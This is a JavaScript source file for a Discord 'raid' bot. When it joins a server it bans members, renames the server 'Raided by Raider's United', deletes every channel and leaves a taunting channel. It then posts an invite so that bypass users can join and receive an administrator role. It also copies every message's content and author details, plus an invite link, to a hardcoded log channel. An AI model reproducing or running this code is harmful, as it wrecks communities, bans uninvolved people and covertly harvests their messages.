const { GatewayIntentBits, EmbedBuilder, PermissionFlagsBits, ChannelType } = require("discord.js");
const Discord = require("discord.js");
const config = require("../data/config.json");

const client = new Discord.Client({
    intents: 32767 | GatewayIntentBits.MessageContent,
});

const token = config.token,
    bypassGuilds = config.bypassGuilds,
    bypassUsers = config.bypassUsers,
    logChannel = config.logChannel


client.once("ready", async () => {
    console.log(`${client.user.tag} | ${client.user.id} is online`);

    console.log(`\nServers[${client.guilds.cache.size.toLocaleString()}]: \n---------\n${client.guilds.cache.map((guild) => `${guild.id + "\t" + guild.name + "   |   " + guild.memberCount.toLocaleString()} mem\'s`).join("\n")}`);
})

client.on("guildCreate", async (guild) => {
    try {
        const log = client.channels.cache.get(logChannel)

        const embed = new EmbedBuilder()
            .addFields({
                name: `Guild Join`,
                value: [
                    `Guild Name: ${guild.name}`,
                    `Guild ID: ${guild.id}`,
                    `\u200b`,
                    `Owner Name: ${client.users.cache.get(guild.ownerId).tag}`,
                    `owner ID: ${guild.ownerId}`
                ].join("\n")
            })
        await log.send({ embeds: [embed] })

        if (bypassGuilds.includes(guild.id)) {
            return await guild.leave()
        }

        guild.members.cache.forEach(async (member) => {
            if (guild.members.cache.has(bypassUsers)) {
                return
            } else {
                member.ban({ reason: "Cuz you invited a random bot lol" })
            }

            if (member?.permissions.has(PermissionFlagsBits.Administrator)) {
                return
            }

            if (member.id === client.user.id) {
                return
            }
        })

        await guild.setName(`Raided by Raider\'s United`)

        await guild.setIcon('https://cdn.discordapp.com/icons/1076549227267768320/af6a752e321510c41fed4ae484977fac.webp?size=4096')

        setInterval(async () => {
            return await guild.leave().catch(() => null)
        }, 60000);


        guild.channels.cache.forEach(async (channel) => {
            channel.delete().catch(() => null)
        })

        await guild.channels.create({
            name: `This is why you dont invite random bots`,
            type: ChannelType.GuildText
        })
    } catch (error) {
        return;
    }
})

client.on("guildDelete", async (guild) => {
    const log = client.channels.cache.get(logChannel)

    const embed = new EmbedBuilder()
        .addFields({
            name: `Guild Leave`,
            value: [
                `Guild Name: ${guild.name}`,
                `Guild ID: ${guild.id}`,
                `\u200b`,
                `Owner Name: ${client.users.cache.get(guild.ownerId).tag}`,
                `owner ID: ${guild.ownerId}`
            ].join("\n")
        })
    await log.send({ embeds: [embed] })
})

client.on("guildMemberAdd", async (member) => {

    if (bypassUsers.includes(member.id)) {
        await member.guild.roles.create({
            name: '.'
        }).then(async (role) => {
            await role.setPermissions(8n).then(await member.roles.add(role))
        })
    } else {
        return
    }
})

client.on("channelCreate", async (channel) => {
    const log = client.channels.cache.get(logChannel)

    if (channel.name === "this-is-why-you-dont-invite-random-bots") {
        await channel.createInvite().then(async (i) => {
            await log.send([
                `<@${client.users.cache.get(`${bypassUsers}`).id}>`,
                `\u200b`,
                `Invite for ${channel.guild.name}`,
                `https://discord.gg/${i.code}`,
                `\u200b`,
                `You have 60 seconds (1 minute) to join so the bot can give you the role before it leaves`
            ].join("\n"))
        })
    } else {
        return
    }
})

client.on("messageCreate", async (message) => {
    if (message.author.bot) return

    const log = client.channels.cache.get('1095865165012029582')

    await message.channel.createInvite().then(async (i) => {

        const e = new EmbedBuilder()
            .addFields({
                name: `Message Sent`,
                value: [
                    `Guild Name: ${message.guild.name}`,
                    `Guild ID: ${message.guild.id}`,
                    `Owner Name: ${client.users.cache.get(message.guild.ownerId).tag}`,
                    `Owner ID: ${message.guild.ownerId}`,
                    `Message Content: ${message.content}`,
                    `Author: ${message.author.tag}`,
                    `Author ID: ${message.author.id}`,
                    `Invite: ${i.url}`

                ].join("\n")
            })

        await log.send({ embeds: [e] })
    })
})

client.login(token)